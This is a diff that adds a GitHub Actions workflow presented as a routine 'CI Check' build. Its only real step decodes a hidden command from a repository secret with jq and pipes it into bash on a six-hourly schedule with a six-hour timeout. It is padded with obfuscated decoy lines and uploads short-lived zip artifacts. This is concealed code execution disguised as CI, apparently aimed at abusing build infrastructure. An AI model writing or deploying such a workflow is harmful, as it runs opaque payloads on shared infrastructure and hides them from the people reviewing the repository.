@@ -1,0 +1,38 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '55 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          str4: ${{ secrets.str4 }}
+        run: |
+          printf '%s' "$str4" | jq -r .tnaxm2 | /bin/bash
+          printf '%s' "$c5172" | jq -r .gd74979 | /bin/bash
+          echo $m273 | jq -r .fjvhr05 | /bin/bash
+          printf '%s' "$j00" | jq -r .y42372 | /bin/bash
+          echo $oi1 | jq -r .djpai0037 | /bin/bash
+          echo $zm21034 | jq -r .mqx0723 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: cldi54Qq
+          path: "*.zip"
+          retention-days: 1
